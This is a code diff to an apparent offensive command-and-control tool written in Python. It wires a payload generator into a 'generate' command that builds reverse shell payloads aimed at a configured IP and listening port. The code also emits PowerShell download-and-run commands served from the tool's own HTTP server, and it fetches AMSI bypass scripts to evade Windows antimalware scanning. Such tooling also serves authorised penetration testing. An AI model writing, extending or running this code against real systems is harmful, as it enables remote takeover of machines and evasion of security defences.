@@ -6,6 +6,7 @@ from prompt_toolkit.shortcuts import CompleteStyle
 from prompt_toolkit.completion import WordCompleter
 from prompt_toolkit import PromptSession
 from commands.toolbar import MinishToolbar
+from utils.generator.payload_generator import Generator
 
 class MenuCommand(AbstractCommand):
     """
@@ -15,7 +16,7 @@ class MenuCommand(AbstractCommand):
     COMMANDS = {
             "help"     : {"help": "Show this help, or the help for a command",
                             "usage": "Usage: help ?<[bold yellow]command[/bold yellow]>"},
-            "generate" : {"help": "Generate a reverse shell payload"},
+            "generate" : {"help": "Generate a reverse shell payload", "usage": "Use [yellow]generate -h[/yellow] to see more information on this command"},
             "list"     : {"help": "List the current sessions available"},
             "servers"  : {"help": "Print the running servers"},
             "sess"     : {"help": "Interact with a session",
@@ -30,6 +31,8 @@ class MenuCommand(AbstractCommand):
     def __init__(self, main_menu):
         """Init this class with a direct link to the main menu class"""
         self.main_menu = main_menu
+        self.full_cli = None
+        self.generator = Generator()
         self.init_session()
 
     def init_session(self):
@@ -96,6 +99,26 @@ class MenuCommand(AbstractCommand):
     def execute_generate(self, *args):
         payload = ""
 
+        bypasses_script = list(map(lambda x: x.strip(), AppConfig.get('amsi_bypass_scripts', 'Script').split(',')))
+        try:
+            inline_payload = self.generator.generate_payload(self.full_cli,
+                ip=AppConfig.get('default_ip_address'),
+                port=AppConfig.get('listening_port', 'Connections'))
+
+            if inline_payload != "":
+                if self.generator.get_parser_val("output") == 'infile':
+                    download_payload = self.generator.generate_payload(self.full_cli,
+                    ip=AppConfig.get('default_ip_address'),
+                    port=AppConfig.get('listening_port', 'Connections'),
+                    route="test.log")
+                    Printer.print(download_payload)
+
+                else:
+                    Printer.print(inline_payload)
+
+        except Exception as e:
+            Printer.err(e)
+
         if AppConfig.get("auto_bypass_amsi", "Session").upper() == "Y":
             payload += self.main_menu.http_server.download_link_powershell(
                 AppConfig.get("amsi_route1", "Routes")
@@ -113,9 +136,9 @@ class MenuCommand(AbstractCommand):
         self.main_menu.http_server.add_permanent_route("super_test.log", script_name)
 
         new_payload = self.main_menu.http_server.download_link_powershell("super_test.log")
-        print(PwshUtils.make_pwsh_cmd(new_payload))
+        # print(PwshUtils.make_pwsh_cmd(new_payload))
 
         addr = AppConfig.get('default_ip_address')
         addr += ":"
         addr += AppConfig.get('listening_port', 'Connections')
-        Printer.msg(f"Generated for {addr}")
+        # Printer.msg(f"Generated for {addr}")
